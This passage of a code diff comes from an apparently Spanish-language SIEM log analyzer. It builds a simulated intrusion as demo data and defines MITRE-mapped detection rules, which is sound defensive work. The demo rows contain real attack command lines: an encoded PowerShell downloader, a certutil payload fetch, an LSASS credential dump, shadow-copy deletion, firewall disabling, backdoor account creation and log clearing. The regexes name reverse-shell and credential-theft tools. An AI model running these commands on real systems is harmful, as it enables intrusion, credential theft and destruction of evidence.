+  push('2026-11-04 09:12:44','a.novak','10.20.31.15','WS-1001','Logon Failure','Error de inicio de sesión: contraseña incorrecta (EventID 4625)','');
+  push('2026-11-04 09:13:02','a.novak','10.20.31.15','WS-1001','Logon Success','Sesión iniciada correctamente (EventID 4624)','');
+  const A='45.155.205.99';
+  for(let i=0;i<16;i++){
+    const t=new Date(2026,10,5,2,13+i,20+((i*7)%39));
+    push(fmtTs(t).slice(0,10)+' '+fmtTs(t).slice(11),i%3===0?'j.svensson':(i%3===1?'admin':'m.lindgren'),A,'VPN-GW-01',
+      'VPN Logon Failure',`Intento de autenticación VPN fallido desde ${A} (EventID 4625, Account Locked Out)`,'');
+  }
+  push('2026-11-05 02:41:07','admin',A,'VPN-GW-01','Account Lockout','Cuenta bloqueada tras múltiples intentos fallidos (EventID 4740)','');
+  push('2026-11-05 02:43:52','j.svensson',A,'VPN-GW-01','VPN Logon Success',`Inicio de sesión VPN exitoso desde ${A} fuera de horario laboral (EventID 4624 Type 3)`,'');
+  push('2026-11-05 02:47:10','j.svensson',A,'WS-1042','Process Creation','Ejecución de proceso (EventID 4688)','whoami /all');
+  push('2026-11-05 02:48:33','j.svensson',A,'WS-1042','Process Creation','Ejecución de proceso (EventID 4688)','systeminfo');
+  push('2026-11-05 02:50:19','j.svensson',A,'WS-1042','Process Creation','Ejecución de proceso (EventID 4688)','net view /all');
+  push('2026-11-05 02:52:44','j.svensson',A,'WS-1042','Process Creation','PowerShell sospechoso (EventID 4688)','powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADMANAAuADEAMAAvAHAuAHMAaAAnACkAOwBJAEUAWAA=');
+  push('2026-11-05 03:01:12','j.svensson',A,'WS-1042','Process Creation','Ejecución de proceso (EventID 4688)','certutil.exe -urlcache -split -f http://185.234.10.77/payload.exe C:\\Users\\Public\\payload.exe');
+  push('2026-11-05 03:05:40','j.svensson',A,'WS-1042','Process Creation','Creación de cuenta local (EventID 4688)','net user svc_backup Str0ngP@ss! /add');
+  push('2026-11-05 03:06:58','j.svensson',A,'WS-1042','Security Group Changed','Miembro añadido a grupo local de administradores (EventID 4732)','net localgroup administrators svc_backup /add');
+  push('2026-11-05 03:10:22','j.svensson',A,'WS-1042','Logon','Inicio de sesión con privilegios especiales asignados (EventID 4672)','');
+  push('2026-11-05 03:15:03','j.svensson','10.20.33.42','SRV-DC01','RDP Connection','Conexión RDP entrante (3389) desde WS-1042 hacia SRV-DC01 con cuenta j.svensson','');
+  push('2026-11-05 03:22:47','j.svensson','10.20.33.42','SRV-FIN01','Network Connection','Conexión SMB a \\\\SRV-FIN01\\ADMIN$ (445) desde WS-1042','');
+  push('2026-11-05 03:31:15','svc_backup','10.20.33.42','SRV-FIN01','Service Installed','Se instaló un nuevo servicio en el sistema (EventID 7045): PSEXESVC','sc \\\\SRV-FIN01 create PSEXESVC binPath= C:\\Windows\\PSEXESVC.exe');
+  push('2026-11-05 03:38:56','j.svensson','10.20.33.42','SRV-FILE01','RDP Connection','Conexión RDP entrante (3389) desde WS-1042 hacia SRV-FILE01','');
+  push('2026-11-05 03:45:09','svc_backup','10.20.34.11','SRV-FIN01','Process Creation','Ejecución de proceso (EventID 4688)','powershell.exe -c "rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\temp\\out.dmp full"');
+  push('2026-11-05 04:00:31','svc_backup','10.20.34.11','SRV-FIN01','Process Creation','Ejecución de proceso (EventID 4688)','vssadmin delete shadows /all /quiet');
+  push('2026-11-05 04:10:02','svc_backup','10.20.34.11','SRV-FIN01','Process Creation','Modificación de configuración de red (EventID 4688)','netsh advfirewall set allprofiles state off');
+  push('2026-11-05 04:12:44','svc_backup','10.20.34.11','SRV-FIN01','Process Creation','Creación de tarea programada (EventID 4688)','schtasks /create /tn "UpdateSvc" /tr C:\\Users\\Public\\payload.exe /sc onstart /ru SYSTEM');
+  push('2026-11-05 04:25:18','svc_backup','10.20.34.11','SRV-FILE01','File Access','Acceso masivo a archivos: 1.204 archivos leídos del recurso \\\\SRV-FILE01\\Finanzas en 6 minutos','');
+  push('2026-11-05 04:31:57','svc_backup','10.20.34.11','SRV-FIN01','Network Connection','Conexión saliente inusual al puerto 4444 hacia 185.234.10.77','');
+  push('2026-11-05 04:40:12','svc_backup','10.20.34.11','SRV-FIN01','Audit Log Cleared','Se borró el registro de eventos de seguridad (EventID 1102)','wevtutil cl Security');
+  return R;
+}
+function loadDemo(){
+  const rows=buildDemoRows();
+  ingestRows(rows,'DEMO_incidente_cliente_SIEM.xlsx (simulado)');
+  toast('Datos de demostración cargados: 180+ eventos con un incidente multi-etapa simulado.');
+}
+function downloadSampleXlsx(){
+  try{
+    const wb=XLSX.utils.book_new();
+    const ws=XLSX.utils.json_to_sheet(buildDemoRows());
+    XLSX.utils.book_append_sheet(wb,ws,'Logs_SIEM');
+    XLSX.writeFile(wb,'plantilla_logs_SIEM_ejemplo.xlsx');
+    toast('Plantilla de ejemplo descargada.');
+  }catch(e){ toast('Error al generar la plantilla: '+e.message,'err'); }
+}
+
+/* ============================================================
+   MOTOR DE ANÁLISIS — REGLAS DE DETECCIÓN (AMPLIADAS)
+============================================================ */
+let FID=0;
+function addFinding(cat,sev,title,tech,justification,impact,actions,evRows,entities){
+  const ev=evRows.slice(0,8).map(r=>({row:r.idx+2,ts:r.ts?fmtTs(r.ts):'—',text:r.raw.slice(0,320)}));
+  const evIdx=evRows.map(r=>r.idx);
+  evRows.forEach(r=>state.suspiciousIdx.add(r.idx));
+  const firstTs=evRows.filter(r=>r.ts).map(r=>r.ts).sort((a,b)=>a-b)[0]||null;
+  state.findings.push({id:'F-'+String(++FID).padStart(2,'0'),cat,sev,title,tech,justification,impact,actions,
+    evidence:ev,evIdx,evCount:evRows.length,entities,firstTs,chainId:null,chainNote:''});
+  (entities.ips||[]).forEach(x=>state.iocs.ips.add(x));
+  (entities.users||[]).forEach(x=>state.iocs.users.add(x));
+  (entities.hosts||[]).forEach(x=>state.iocs.hosts.add(x));
+  (entities.cmds||[]).forEach(x=>state.iocs.cmds.add(x.slice(0,160)));
+}
+function entCollect(rows){
+  const ips=new Set(),usrs=new Set(),hs=new Set(),cmds=new Set();
+  rows.forEach(r=>{ if(r.srcIp)ips.add(r.srcIp); if(r.user)usrs.add(r.user); if(r.dstHost)hs.add(r.dstHost);
+    if(r.cmd&&r.cmd.length>3)cmds.add(r.cmd); });
+  return {ips:[...ips],users:[...usrs],hosts:[...hs],cmds:[...cmds]};
+}
+
+const AUTH=/logon|login|auth|sesi|signin|sign-in|vpn|4624|4625|credential|kerberos|ntlm/i;
+const FAIL=/fail|fallid|error|invalid|incorrect|denied|4625|rechaz|bloqueo|locked|bad password|contrase/i;
+const OK=/success|exitoso|éxito|exito|4624|logged on|sesión iniciada|sesion iniciada|accepted|granted/i;
+
+function detectBruteForce(){
+  const groups={};
+  state.rows.forEach(r=>{
+    if(AUTH.test(r.txt)&&FAIL.test(r.txt)&&!OK.test(r.txt)){
+      const k=r.srcIp||('USER::'+(r.user||'?')); (groups[k]=groups[k]||[]).push(r);
+    }
+  });
+  for(const [k,arr] of Object.entries(groups)){
+    if(arr.length<3) continue; // umbral sensible: desde 3 intentos
+    const timed=arr.filter(r=>r.ts).sort((a,b)=>a.ts-b.ts);
+    let burst=arr.length>=4;
+    for(let i=0;i<timed.length&&!burst;i++){
+      const w=timed.filter(t=>t.ts>=timed[i].ts&&t.ts<=new Date(timed[i].ts.getTime()+10*60000));
+      if(w.length>=3) burst=true;
+    }
+    if(!burst) continue;
+    const ip=k.startsWith('USER::')?'':k;
+    const successRow=state.rows.find(r=>OK.test(r.txt)&&!FAIL.test(r.txt)&&AUTH.test(r.txt)&&((ip&&r.srcIp===ip)));
+    const targets=[...new Set(arr.map(r=>r.user).filter(Boolean))];
+    const sev=successRow?'Crítico':'Alto';
+    const window=timed.length>=2?` (periodo ${fmtTs(timed[0].ts)} → ${fmtTs(timed[timed.length-1].ts)})`:' (sin marca de tiempo consistente)';
+    addFinding('Fuerza Bruta',sev,
+      `Ataque de fuerza bruta${ip?` desde ${ip}`:''} — ${arr.length} intentos fallidos contra ${targets.length} cuenta(s)`,
+      `Se registraron ${arr.length} eventos de autenticación fallida${window} originados ${ip?`en la IP ${ip}`:'en el mismo origen'} dirigidos a ${targets.length?targets.map(t=>`"${t}"`).join(', '):'cuentas no identificadas'}. La concentración de fallos en un origen único y contra múltiples cuentas en un intervalo corto es el patrón clásico de fuerza bruta / password spraying (MITRE ATT&CK T1110).` +
+      (successRow?` Con posterioridad, a las ${fmtTs(successRow.ts)}, se registró un inicio de sesión EXITOSO (${successRow.user||'cuenta no registrada'}) desde el mismo origen ${ip}, lo que indica que las credenciales fueron comprometidas (T1110.001 → T1078).`:' No se observó ningún inicio de sesión exitoso posterior desde el mismo origen en los registros analizados.'),
+      `${arr.length} fallos concentrados en ventana corta desde un único origen exceden ampliamente el umbral operativo normal (≤2 fallos/día por usuario). ${successRow?'La autenticación exitosa subsiguiente confirma el compromiso de credenciales y eleva la criticidad al máximo nivel.':'La ausencia de éxito confirmado reduce la criticidad, pero el patrón sigue siendo malicioso.'}`,
+      successRow?'Acceso no autorizado confirmado a la red corporativa; posible punto de entrada del incidente. Punto de apoyo para etapas posteriores (ejecución, escalada, movimiento lateral).':'Intento de compromiso de credenciales; riesgo latente de acceso si alguna contraseña débil no fue detectada en este lote de logs.',
+      successRow?['Contener de inmediato: bloquear la IP de origen en el perímetro/firewall y desconectar la VPN.','Deshabilitar y forzar reset de la cuenta comprometida y de todas las cuentas atacadas.','Revisar toda la actividad posterior de la sesión exitosa (ya correlacionada en otros hallazgos).']
+            :['Bloquear la IP de origen en firewall/VPN y añadir a lista de amenazas.','Forzar reset de contraseñas de las cuentas atacadas.','Habilitar MFA y políticas de bloqueo de cuenta (lockout) si no existen.'],
+      arr.concat(successRow?[successRow]:[]),
+      {...entCollect(arr),ips:ip?[ip,...new Set(arr.map(r=>r.srcIp).filter(x=>x&&x!==ip))]:[...new Set(arr.map(r=>r.srcIp).filter(Boolean))]}
+    );
+    if(successRow&&ip){ state._bfSuccessIps=state._bfSuccessIps||new Set(); state._bfSuccessIps.add(ip); }
+  }
+}
+
+const CMD_RULES=[
+ {re:/mimikatz|sekurlsa|comsvcs\.dll.*minidump|minidump.*lsass|lsass.*dump|invoke-mimikatz/i,sev:'Crítico',
+  name:'Volcado de credenciales desde memoria LSASS (tooling tipo Mimikatz)',
+  tech:'Se detectó la ejecución de comandos que acceden o vuelcan la memoria del proceso LSASS (Local Security Authority Subsystem Service), técnica empleada por Mimikatz y por el módulo MiniDump de comsvcs.dll para extraer contraseñas en claro, hashes NTLM y tickets Kerberos de usuarios con sesión activa (MITRE ATT&CK T1003.001 – OS Credential Dumping: LSASS Memory).',
+  impact:'Compromiso total de las credenciales de los usuarios con sesión en el equipo afectado. Permite al atacante autenticarse como administrador de dominio (pass-the-hash) y tomar control de cualquier sistema de la organización.',
+  actions:['Aislar inmediatamente el equipo afectado de la red (sin apagarlo, para preservar memoria).','Resetear las credenciales y tickets Kerberos de TODAS las cuentas que tuvieron sesión en el equipo.','Cazar (threat hunting) usos posteriores de esas credenciales en el resto de logs.']},
+ {re:/ntds\.dit|reg\s+save\s+(sam|security|system)|esentutl[^|]*\/copy|diskshadow|vssadmin\s+create/i,sev:'Crítico',
+  name:'Intento de robo de la base de credenciales del dominio (NTDS.dit / SAM)',
+  tech:'Comandos orientados a copiar NTDS.dit o los hives SAM/SECURITY/SYSTEM del registro, técnica T1003.002/003 (Security Account Manager / NTDS). Solo tiene sentido operativo para un atacante que busca hashes de TODAS las cuentas del dominio.',
+  impact:'Compromiso de la totalidad de las credenciales del dominio; equivalente a la toma completa de Active Directory.',
+  actions:['Considerar comprometido el dominio: plan de reseteo masivo de credenciales (incluidas krbtgt x2).','Aislar el controlador de dominio afectado y preservar evidencia forense.','Buscar signos de exfiltración del archivo NTDS.dit.']},
+ {re:/powershell(\.exe)?[^|]*(-enc\b|-e\s+[a-z0-9+\/=]{20,}|encodedcommand|-nop\b|-w\s*hidden|-windowstyle\s*hidden|downloadstring|invoke-expression|iex\s*\(|iwr\s+http|invoke-webrequest\s+http|invoke-shellcode)/i,sev:'Crítico',
+  name:'Ejecución ofuscada / descargador PowerShell',
+  tech:'Ejecución de PowerShell con parámetros de ofuscación (-enc/-EncodedCommand, -nop, -w hidden) o con descarga de código remoto en memoria (DownloadString/IEX). El flag -EncodedCommand transporta código Base64 que oculta la intención del atacante; es el vector estándar de loaders y frameworks C2 (T1059.001 – Command and Scripting Interpreter: PowerShell).',
+  impact:'Ejecución de carga maliciosa arbitraria en el endpoint con los privilegios del usuario; puerta de entrada habitual de ransomware, RATs y robo de datos.',
+  actions:['Decodificar el payload Base64 en entorno aislado para determinar la carga ejecutada.','Bloquear/habilitar logging completo de PowerShell (ScriptBlock Logging + Transcription).','Buscar conexiones salientes del equipo hacia IPs externas en el mismo intervalo.']},
+ {re:/vssadmin\s+delete\s+shadows|wmic\s+shadowcopy\s+delete|delete\s+systemstatebackup|wbadmin\s+delete/i,sev:'Crítico',
+  name:'Borrado de copias de sombra / respaldos (pre-ransomware)',
+  tech:'El comando vssadmin delete shadows (o wmic shadowcopy delete) elimina las Volume Shadow Copies de Windows, impidiendo la recuperación local de archivos. Es el paso previo característico de familias de ransomware y de ataques destructivos (T1490 – Inhibit System Recovery).',
+  impact:'Sin copias de sombra ni respaldo reciente verificado, el cifrado posterior de archivos provocaría pérdida de datos permanente e interrupción operativa prolongada.',
+  actions:['Verificar de inmediato el estado de los respaldos offline/inmutables del servidor afectado.','Aislar el equipo y asumir compromiso activo: iniciar respuesta a incidente.','Preservar evidencia forense antes de cualquier remediación.']},
+ {re:/nc(\.exe)?\s+[^|]*-e\b|bash\s+-i\b|\/dev\/tcp\/|socat[^|]*exec|powershell[^|]*tcpclient|reverse\s*shell/i,sev:'Crítico',
+  name:'Shell inversa / canal de control interactivo',
+  tech:'Patrones de shell inversa (netcat -e, bash -i >& /dev/tcp, socat exec, PowerShell TcpClient): establecen un canal interactivo entrante hacia el atacante (T1059 + T1571).',
+  impact:'Control remoto total y en tiempo real del equipo comprometido.',
+  actions:['Aislar el equipo y bloquear la IP destino de la conexión.','Analizar el proceso padre que lanzó la shell.','Revisar reglas de firewall saliente.']},
+ {re:/certutil(\.exe)?[^|]*(-urlcache|-decode)|bitsadmin\s+\/transfer|mshta(\.exe)?\s+http/i,sev:'Alto',
+  name:'Descarga de binarios mediante LOLBins (certutil/bitsadmin/mshta)',
+  tech:'Uso de binarios legítimos del sistema (Living-off-the-Land) para descargar o decodificar payloads desde infraestructura externa, evadiendo controles que no monitorizan estas herramientas (T1140, T1105 – Ingress Tool Transfer).',
+  impact:'Introducción de herramientas ofensivas adicionales (RATs, dumpers, ransomware) en la red interna.',
+  actions:['Bloquear en proxy/firewall el dominio o IP de destino de la descarga.','Analizar el binario descargado (hash) en sandbox y buscar su presencia en otros equipos.','Añadir reglas EDR/SIEM para certutil -urlcache y bitsadmin /transfer.']},
+ {re:/netsh\s+advfirewall[^|]*state\s+off|set-mppreference[^|]*disable|sc\s+(stop|delete)\s+(windefend|wscsvc|sense)|taskkill[^|]*(msmpeng|egui)/i,sev:'Alto',
+  name:'Desactivación deliberada de defensas (Firewall / Antivirus)',
+  tech:'El comando desactiva el Firewall de Windows o componentes del antivirus. Ninguna operación administrativa legítima nocturna requiere apagar las defensas; es preparación del terreno para C2 o despliegue de malware (T1562.001 – Impair Defenses).',
+  impact:'El equipo queda expuesto y permite tráfico malicioso saliente sin inspección; facilita la propagación.',
+  actions:['Reactivar y verificar el estado de las defensas en todos los equipos citados.','Revisar tamper-protection del EDR y habilitar política de no-override por GPO.','Investigar qué procesos se ejecutaron con las defensas apagadas.']},
+ {re:/net\s+user\s+\S+\s+\S+\s*\/add|useradd\s|adduser\s/i,sev:'Alto',
+  name:'Creación de cuenta local no autorizada (backdoor)',
+  tech:'Creación de una cuenta de usuario mediante línea de comandos fuera de un proceso de alta gestionado. Los atacantes crean cuentas locales ("svc_*", nombres que imitan servicios) para mantener persistencia y acceso posterior (T1136.001 – Create Account: Local Account).',
+  impact:'Puerta trasera persistente: aunque se revoquen las credenciales robadas, el atacante conserva acceso con la cuenta creada.',
+  actions:['Deshabilitar y eliminar la cuenta creada; auditar su actividad desde la creación.','Revisar pertenencia a grupos locales en todos los equipos afectados.','Monitorizar EventID 4720/4732 de forma centralizada.']},
+ {re:/wmic\s+\/node:[^|]*process\s+call\s+create|sc\s+\\\\\S+\s+(create|start)|at\s+\\\\\S+\s/i,sev:'Alto',
+  name:'Ejecución remota de procesos/servicios (WMI · sc · at)',
+  tech:'Uso de WMI remoto, sc \\\\servidor o at \\\\servidor para crear procesos o servicios en OTRO equipo: ejecución remota típica de movimiento lateral y despliegue de malware (T1047 – WMI, T1569.002 – Service Execution).',
+  impact:'Capacidad de ejecutar código arbitrario en sistemas remotos con privilegios de servicio.',
+  actions:['Identificar el equipo origen y la cuenta usada; resetear sus credenciales.','Eliminar servicios/procesos creados remotamente.','Restringir WMI y acceso administrativo remoto por GPO.']},
+ {re:/schtasks\s+\/create|reg\s+add[^|]*(\\Run|\\RunOnce|CurrentVersion)|new-itemproperty[^|]*run\b/i,sev:'Medio',
+  name:'Mecanismo de persistencia (tarea programada / clave Run)',
+  tech:'Creación de tareas programadas o entradas de registro Run/RunOnce para re-ejecutar el payload en cada arranque o bajo demanda (T1053.005, T1547.001 – Boot or Logon Autostart Execution).',
+  impact:'La infección sobrevive a reinicios, prolongando el incidente en el tiempo.',
+  actions:['Enumerar y eliminar tareas programadas y claves Run no reconocidas en los equipos afectados.','Comparar contra la línea base de configuración conocida.']},
+ {re:/rundll32(\.exe)?[^|]*(\\temp|\\appdata|\\users\\public|\.dat\b|javascript:)/i,sev:'Alto',
+  name:'Ejecución anómala vía rundll32 desde rutas temporales',
+  tech:'rundll32 invocando binarios desde rutas de usuario (Temp, AppData, Users\\Public) es un patrón clásico de ejecución de malware sin dropper firmado (T1218.011 – System Binary Proxy Execution: Rundll32).',
+  impact:'Ejecución de código malicioso evadiendo restricciones de aplicaciones que confían en binarios de sistema.',
+  actions:['Recuperar y analizar el binario invocado (si aún existe) y su hash.','Aplicar AppLocker/WDAC para bloquear ejecución desde rutas de usuario.']},
+ {re:/adfind\b|dsquery\b|dsget\b|get-aduser|get-addomain|get-adcomputer|csvde\b|ldifde\b|nltest\s+\/dclist/i,sev:'Medio',
+  name:'Enumeración de Active Directory',
+  tech:'Herramientas de consulta de AD (AdFind, dsquery, Get-ADUser, csvde, nltest /dclist) usadas para mapear usuarios, equipos y controladores de dominio (T1087.002 – Account Discovery: Domain Account).',
+  impact:'El atacante identifica cuentas privilegiadas y sistemas críticos para dirigir la siguiente fase.',
+  actions:['Verificar quién y desde dónde ejecutó las consultas.','Correlacionar con cuentas comprometidas detectadas en otros hallazgos.']},
+ {re:/(whoami|systeminfo|ipconfig\s+\/all|net\s+view|net\s+group|nltest|quser|net\s+accounts|net\s+localgroup|tasklist|netstat\s+-an|arp\s+-a|route\s+print)\b/i,sev:'Medio',
+  name:'Ejecución de comandos de reconocimiento del entorno',
+  tech:'Conjunto de utilidades nativas (whoami, systeminfo, net view, nltest, tasklist, netstat, arp, route print…) ejecutadas para descubrir usuario actual, configuración, conexiones y estructura de la red (T1087/T1016/T1018/T1057/T1049). Individuales son legítimas; la secuencia fuera de horario y tras un login anómalo es característica de actividad intrusiva.',
+  impact:'El atacante cartografía la red para seleccionar objetivos de alto valor (controladores de dominio, servidores financieros, archivos).',
+  actions:['Correlacionar la cuenta que ejecutó los comandos con el origen del inicio de sesión.','Establecer línea base de estos comandos por rol para reducir falsos positivos.']},
+ {re:/(7z|rar|zip)\S*\s+[^|]*(-p\S*|password)|(compress-archive|tar)\b[^|]*(finanzas|datos|backup|\.zip|\.rar|\.7z)/i,sev:'Medio',
+  name:'Empaquetado/compresión de datos (posible staging para exfiltración)',
+  tech:'Creación de archivos comprimidos —potencialmente con contraseña— sobre carpetas sensibles, patrón previo a la exfiltración (T1560 – Archive Collected Data).',
+  impact:'Preparación de un paquete de datos para su robo; riesgo directo de fuga de información.',
+  actions:['Identificar el contenido comprimido y su destino.','Correlacionar con conexiones salientes posteriores del mismo equipo.']},
+ {re:/(curl|wget|invoke-webrequest)[^|]*http[^|]*(-o\s|-O\s|--output|\|)|certutil[^|]*http/i,sev:'Medio',
+  name:'Descarga de contenido desde Internet en equipo corporativo',
+  tech:'Descarga directa de ficheros desde infraestructura externa mediante herramientas de línea de comandos, patrón frecuente en etapas iniciales de intrusión (T1105).',
+  impact:'Posible introducción de herramientas ofensivas en la red.',
+  actions:['Inspeccionar el destino de la descarga y bloquearlo en el proxy.','Buscar el fichero descargado por hash en el resto del parque.']},
+ {re:/(scp|ftp|sftp|tftp)\b[^|]*(put|upload|-o)|robocopy[^|]*\\(temp|public)|xcopy[^|]*\/s[^|]*(finanzas|datos|rrhh)/i,sev:'Alto',
+  name:'Transferencia/ copia masiva hacia ubicaciones inusuales',
+  tech:'Movimiento de volúmenes de datos hacia rutas temporales o protocolos de transferencia externos (T1048/T1020 – Exfiltration Over Alternative Protocol).',
+  impact:'Riesgo material de fuga de información corporativa o personal (GDPR).',
+  actions:['Determinar destino y volumen transferido.','Bloquear el protocolo/canal si no es corporativo.','Notificar al DPO si hay datos personales involucrados.']},
+];
+
+function detectCommands(){
+  const pool=state.rows.filter(r=>(r.cmd&&r.cmd.length>2)||/process creation|4688|comando|commandline|powershell|cmd\.exe|bash|sh\s+-c/i.test(r.txt));
+  CMD_RULES.forEach(rule=>{
+    const hits=pool.filter(r=>rule.re.test(r.cmd||'')||rule.re.test(r.raw));
+    if(!hits.length) return;
+    const sample=(hits.find(h=>h.cmd)||hits[0]).cmd||hits[0].raw;
+    const uniq=[...new Set(hits.map(h=>h.cmd||h.raw.slice(0,120)))];
+    const hosts=[...new Set(hits.map(h=>h.dstHost).filter(Boolean))];
+    const tss=hits.filter(h=>h.ts).map(h=>h.ts).sort((a,b)=>a-b);
+    addFinding('Comandos y Procesos',rule.sev,rule.name+` (${hits.length} evento(s))`,
+      rule.tech+` Registros coincidentes: ${hits.length}${tss.length?`, entre ${fmtTs(tss[0])} y ${fmtTs(tss[tss.length-1])}`:''}${hosts.length?`. Equipos afectados: ${hosts.join(', ')}`:''}. Comando representativo: "${String(sample).slice(0,200)}".`,
+      `La detección se basa en ${hits.length} registro(s) real(es) del archivo del cliente cuyo contenido coincide con el patrón de la técnica indicada (todos listados en la evidencia y en el Anexo de clasificación individual). Severidad ${rule.sev} según el potencial ofensivo documentado de la técnica (MITRE ATT&CK).`,
+      rule.impact, rule.actions, hits, {...entCollect(hits),cmds:uniq.slice(0,6)});
+  });
+}
+
+function detectSuspiciousLogins(){
+  const bfIps=state._bfSuccessIps||new Set();
+  const groups={};
+  state.rows.forEach(r=>{
+    if(!r.ts) return;
+    if(OK.test(r.txt)&&!FAIL.test(r.txt)&&AUTH.test(r.txt)&&r.user){
+      if(bfIps.has(r.srcIp)) return; // ya cubierto por fuerza bruta
+      const h=r.ts.getHours();
+      if(h>=0&&h<6){ const k=r.user+'@@'+(r.srcIp||'?'); (groups[k]=groups[k]||[]).push(r); }
+    }
+  });
+  for(const [k,arr] of Object.entries(groups)){
+    const [user,ip]=k.split('@@');
+    const tss=arr.map(r=>r.ts).sort((a,b)=>a-b);
+    addFinding('Inicios Sospechosos','Alto',
+      `Inicio(s) de sesión exitoso(s) fuera de horario laboral — usuario "${user}"${ip!=='?'?` desde ${ip}`:''}`,
+      `Se registraron ${arr.length} autenticación(es) exitosa(s) del usuario "${user}" entre las 00:00 y las 05:59${tss.length?` (primera: ${fmtTs(tss[0])}, última: ${fmtTs(tss[tss.length-1])})`:''}${ip!=='?'?` desde la dirección ${ip}`:''}. La franja nocturna está fuera del horario operativo de la organización en Estocolmo; ningún cambio autorizado fue reportado para esa ventana.`,
+      'El horario anómalo (madrugada) combinado con el contexto del incidente reduce drásticamente la probabilidad de actividad legítima. Se clasifica como Alto porque, aunque la cuenta podría ser de un administrador con turno nocturno, debe verificarse.',
+      'Posible sesión ilegítima con credenciales comprometidas; punto de entrada o reentrada del atacante a la red.',
+      ['Confirmar con RRHH/usuario si existía trabajo nocturno autorizado en esas fechas.','Si no se confirma: deshabilitar la cuenta, resetear credenciales y revocar tokens/sesiones VPN.','Revisar el origen (¿IP conocida? ¿VPN? ¿geo-localización coherente?).'],
+      arr, entCollect(arr));
+  }
+}
+
+const LAT=/\brdp\b|3389|\bsmb\b|\b445\b|winrm|5985|5986|psexec|psexesvc|\bwmi\b|admin\$|\\c\$|remote (desktop|connection)|conexión remota|conexion remota|pass.the.hash|remote service|scheduled task on remote/i;
+function detectLateral(){
+  const bySource={};
+  state.rows.forEach(r=>{
+    if(!LAT.test(r.txt)) return;
+    const src=r.srcIp||r.user||'?';
+    (bySource[src]=bySource[src]||[]).push(r);
+  });
+  for(const [src,arr] of Object.entries(bySource)){
+    const dsts=[...new Set(arr.map(r=>r.dstHost).filter(Boolean))];
+    const psexecHit=arr.some(r=>/psexec|psexesvc|7045.*psex|admin\$/i.test(r.txt));
+    if(dsts.length>=2||psexecHit){
+      const tss=arr.filter(r=>r.ts).map(r=>r.ts).sort((a,b)=>a-b);
+      const sev=(dsts.length>=3||psexecHit)?'Crítico':'Alto';
+      addFinding('Movimiento Lateral',sev,
+        `Movimiento lateral desde ${src} hacia ${dsts.length} sistema(s): ${dsts.join(', ')||'destinos en registros de conexión remota'}`,
+        `Se identificaron ${arr.length} eventos de conexión remota (RDP/3389, SMB/445, WinRM, WMI o instalación de servicios remotos tipo PsExec) originados en ${src} y dirigidos a ${dsts.length?dsts.join(', '):'varios destinos'}${tss.length>=2?`, entre ${fmtTs(tss[0])} y ${fmtTs(tss[tss.length-1])}`:''}. El salto entre múltiples servidores en un intervalo corto —${psexecHit?'incluyendo la instalación de un servicio remoto ejecutable (PsExec/Admin$), indicador de ejecución remota directa (T1021.002, T1570),':''}— constituye movimiento lateral (MITRE ATT&CK T1021 – Remote Services).`,
+        `${dsts.length>=3?'Alcance multi-servidor confirmado en los logs: la intrusión dejó de estar contenida en un único equipo.':'Existe al menos un salto documentado entre sistemas, suficiente para considerar comprometido el segmento.'} Criticidad ${sev} por el número de sistemas alcanzados y los mecanismos empleados.`,
+        'Expansión del compromiso a servidores críticos (directorio activo, finanzas, archivos). Riesgo de cifrado masivo (ransomware), robo de información sensible y caída de servicios corporativos.',
+        ['Aislar de la red los equipos origen y destino identificados.','Revisar todas las cuentas usadas en las sesiones remotas y resetear sus credenciales.','Inspeccionar servicios instalados remotamente (p. ej. PSEXESVC) y eliminarlos.','Habilitar segmentación de red y restringir RDP/SMB entre estaciones y servidores.'],
+        arr, entCollect(arr));
+    }
+  }
+}
+
+/* Sesiones de un mismo usuario en ≥4 equipos distintos en ≤2 h (no ya marcadas) */
+function detectMultiHostLogon(){
+  const byUser={};
+  state.rows.forEach(r=>{
+    if(state.suspiciousIdx.has(r.idx)) return;
+    if(!(r.ts&&r.user&&r.dstHost)) return;
+    if(!(OK.test(r.txt)&&AUTH.test(r.txt)&&!FAIL.test(r.txt))) return;
+    (byUser[r.user]=byUser[r.user]||[]).push(r);
+  });
+  for(const [u,arr] of Object.entries(byUser)){
+    if(arr.length<4) continue;
+    arr.sort((a,b)=>a.ts-b.ts);
+    let win=null;
+    for(let i=0;i<arr.length;i++){
+      const w=arr.filter(t=>t.ts>=arr[i].ts&&t.ts<=new Date(arr[i].ts.getTime()+2*3600000));
+      if(new Set(w.map(t=>t.dstHost)).size>=4){ win=w; break; }
+    }
+    if(!win) continue;
+    const hosts=[...new Set(win.map(t=>t.dstHost))];
+    addFinding('Movimiento Lateral','Medio',
+      `Sesiones del usuario "${u}" en ${hosts.length} equipos distintos en ≤2 h (${hosts.join(', ')})`,
+      `La cuenta "${u}" registró ${win.length} inicios de sesión exitosos en ${hosts.length} equipos diferentes dentro de una ventana de 2 horas (${fmtTs(win[0].ts)} → ${fmtTs(win[win.length-1].ts)}). Este patrón de dispersión es inusual frente a la línea base del usuario y puede indicar cuenta compartida, suplantación con credenciales válidas o desplazamiento lateral silencioso (T1078 – Valid Accounts).`,
+      'Se clasifica como Medio (no Alto) porque los registros por sí solos no permiten distinguir entre uso legítimo intensivo y actividad maliciosa; requiere validación. De confirmarse como no autorizado, escalaría a Alto/Crítico.',
+      'Posible uso de credenciales válidas por un tercero para recorrer la red sin generar alertas de autenticación fallida.',
+      ['Validar con el titular de la cuenta y con RRHH la legitimidad de las sesiones.','Si no se confirma: tratar como credenciales comprometidas (reset + revocación de sesiones).','Revisar el origen (IP/equipo) de cada sesión en logs completos del SIEM.'],
+      win, entCollect(win));
+  }
+}
+
+const ESC_RULES=[
+ {re:/4732|4728|member was added.*(administrators|administradores)|added to.*(local\s*)?(administrators|administradores)|net\s+localgroup\s+(administrators|administradores)|user was added/i,sev:'Crítico',
+  name:'Elevación de privilegios: cuenta añadida al grupo de Administradores',
+  tech:'Los registros incluyen la adición de un miembro a un grupo local de administradores (EventID 4732/4728 o comando net localgroup administrators … /add). Esta acción otorga control total sobre el equipo y es una técnica explícita de escalada (T1098/T1136 + T1068).',
+  impact:'La cuenta afectada (frecuentemente una backdoor recién creada) obtiene privilegios administrativos: control completo del sistema, desactivación de defensas y preparación para movimiento lateral con credenciales privilegiadas.',
